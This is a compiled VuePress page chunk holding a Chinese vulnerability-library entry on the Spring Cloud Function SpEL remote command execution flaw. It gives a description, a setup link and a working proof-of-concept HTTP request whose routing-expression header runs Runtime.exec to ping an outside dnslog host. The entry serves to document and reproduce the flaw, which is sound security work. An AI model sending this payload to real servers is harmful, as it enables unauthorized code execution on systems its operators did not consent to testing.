(window.webpackJsonp=window.webpackJsonp||[]).push([[197],{1070:function(t,s,a){t.exports=a.p+"assets/img/1648445963507-0e8edf45-ca97-444a-b9f2-6e1ce7a1c838.bcded5b7.png"},1071:function(t,s,a){t.exports=a.p+"assets/img/1648446987819-85f1a250-ed53-4794-9168-286030887cc4.31aba40e.png"},2176:function(t,s,a){"use strict";a.r(s);var n=a(75),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,n=t._self._c||s;return n("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[n("h1",{attrs:{id:"spring-cloud-function-spel-远程命令执行漏洞"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#spring-cloud-function-spel-远程命令执行漏洞"}},[t._v("#")]),t._v(" Spring Cloud Function SPEL 远程命令执行漏洞")]),t._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),n("p",[t._v("Spring Cloud Function 是基于Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。 由于Spring Cloud Function中RoutingFunction类的apply方法将请求头中的“spring.cloud.function.routing-expression”参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，未经授权的远程攻击者可利用该漏洞执行任意代码。")]),t._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("Spring Cloud Function ")]),n("br"),t._v(" "),n("h2",{attrs:{id:"环境搭建"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[t._v("#")]),t._v(" 环境搭建")]),t._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[t._v("https"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//github.com/spring-cloud/spring-cloud-function/tree/main/spring-cloud-function-samples/function-sample-pojo")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),n("p",[t._v("搭建后访问")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1070),alt:"img"}})]),t._v(" "),n("p",[t._v("发送POC")]),t._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("POST")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("functionRouter "),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("HTTP")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nHost"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v(".1")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v(".27")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("9000")]),t._v("\nspring"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("routing"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("expression"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("T")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("java"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("lang"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("Runtime"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("getRuntime")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("exec")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"ping -c 1 dxytoy.dnslog.cn"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nContent"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Length"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br")])]),n("p",[n("img",{attrs:{src:a(1071),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=e.exports}}]);